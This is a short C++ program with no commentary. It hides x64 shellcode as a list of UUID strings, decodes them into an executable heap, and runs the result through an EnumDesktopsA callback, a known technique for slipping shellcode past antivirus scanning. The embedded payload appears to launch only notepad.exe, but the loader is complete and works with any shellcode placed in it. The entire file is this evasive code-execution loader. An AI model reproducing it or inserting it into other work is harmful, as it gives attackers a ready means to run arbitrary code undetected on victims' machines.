#include <windows.h>
#include <rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] = {
"e48348fc-e8f0-00c0-0000-415141505251",
"d2314856-4865-528b-6048-8b5218488b52",
"728b4820-4850-b70f-4a4a-4d31c94831c0",
"7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
"48514152-528b-8b20-423c-4801d08b8088",
"48000000-c085-6774-4801-d0508b481844",
"4920408b-d001-56e3-48ff-c9418b348848",
"314dd601-48c9-c031-ac41-c1c90d4101c1",
"f175e038-034c-244c-0845-39d175d85844",
"4924408b-d001-4166-8b0c-48448b401c49",
"8b41d001-8804-0148-d041-5841585e595a",
"59415841-5a41-8348-ec20-4152ffe05841",
"8b485a59-e912-ff57-ffff-5d48ba010000",
"00000000-4800-8d8d-0101-000041ba318b",
"d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
"c48348d5-3c28-7c06-0a80-fbe07505bb47",
"6a6f7213-5900-8941-daff-d56e6f746570",
"652e6461-6578-9000-9090-909090909090",
};

int main() {
	int elems = sizeof(uuids) / sizeof(uuids[0]);
	HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	VOID* mem = HeapAlloc(hc, 0, 0x100000);
	DWORD_PTR hptr = (DWORD_PTR)mem;
	for (int i = 0; i < elems; i++) {
		RPC_CSTR rcp_cstr = (RPC_CSTR) * (uuids+i);
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID*)hptr);
		if (status != RPC_S_OK) {
			printf("[-] UUID convert error\n");
			CloseHandle(mem);
			return -1;
		}
		hptr += 16;
	}

	EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
	CloseHandle(mem);
	return 0;
}